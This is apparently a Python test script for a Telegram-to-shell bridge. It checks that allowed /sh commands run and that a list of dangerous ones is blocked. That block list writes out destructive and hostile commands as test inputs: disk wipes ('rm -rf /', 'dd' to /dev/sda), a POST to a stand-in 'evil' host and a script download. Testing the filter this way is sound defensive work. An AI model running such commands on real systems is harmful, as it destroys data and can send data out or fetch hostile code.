import importlib.util
s = importlib.util.spec_from_file_location('p', '/usr/local/bin/puente_telegram.py')
m = importlib.util.module_from_spec(s)
s.loader.exec_module(m)

DEBE = [
    ("/sh ls /var/www/marketattack",              "listar"),
    ("/sh cat /etc/hostname",                      "leer archivo"),
    ("/sh df -h /",                               "disco"),
    ("/sh free -m",                               "memoria"),
    ("/sh uptime",                                "uptime"),
    ("/sh verificar_tienda.sh todas",             "auditar tiendas"),
    ("/sh /usr/local/bin/verificar_tienda.sh todas", "ruta completa"),
    ("/sh tail -3 /var/log/opencode.log",         "leer log"),
    ("/sh echo hola",                             "echo"),
    ("/sh date",                                  "fecha"),
    ("/comandos",                                 "lista de comandos"),
    ("/producto",                                 "catalogo de venta"),
    ("/oferta",                                   "mensaje para cliente"),
    ("/precios",                                  "tabla de precios"),
    ("/prospectos",                               "ver prospectos"),
    ("/ayuda",                                    "ayuda con los comandos nuevos"),
]
NO_DEBE = [
    ("/sh rm -rf /",                              "borrar disco"),
    ("/sh rm /var/www/marketattack",              "borrar web"),
    ("/sh chmod 777 /",                           "cambiar permisos"),
    ("/sh curl -X POST http://evil",              "curl con POST"),
    ("/sh wget http://x.sh",                      "descargar y ejecutar"),
    ("/sh shutdown now",                          "apagar"),
    ("/sh pkill -9 opencode",                     "matar proceso"),
    ("/sh dd if=/dev/zero of=/dev/sda",           "destruir disco"),
    ("/sh sudo rm -rf /",                         "sudo borrar"),
    ("/reiniciar mysql",                          "servicio no permitido"),
    ("/reiniciar ..",                             "servicio raro"),
]
ok = fallos = 0
print("═══ DEBE FUNCIONAR ═══")
for cmd, desc in DEBE:
    try:
        r = str(m.procesar(cmd) or "")
    except Exception as e:
        r = f"EXCEPCIÓN {e}"
    mal = any(x in r for x in ["EXCEPCIÓN", "no está en la lista", "puede romper"])
    print(("  ✗ " if mal else "  ✓ ") + cmd)
    if mal: fallos += 1; print("      " + r[:180].replace("\n", " "))
    else: ok += 1
print("\n═══ DEBE BLOQUEAR ═══")
for cmd, desc in NO_DEBE:
    try:
        r = str(m.procesar(cmd) or "")
    except Exception as e:
        r = f"EXCEPCIÓN {e}"
    bloqueado = ("puede romper" in r or "no está en la lista" in r
                 or "Servicios permitidos" in r or "⚠️" in r)
    print(("  ✓ " if bloqueado else "  ✗ FUGÓ: ") + cmd)
    if bloqueado: ok += 1
    else:
        fallos += 1
        print("      → " + r[:200].replace("\n", " "))
print(f"\n{'🎉 TODO CORRECTO' if fallos==0 else f'🚨 {fallos} FALLOS'}: {ok} OK, {fallos} fallos")
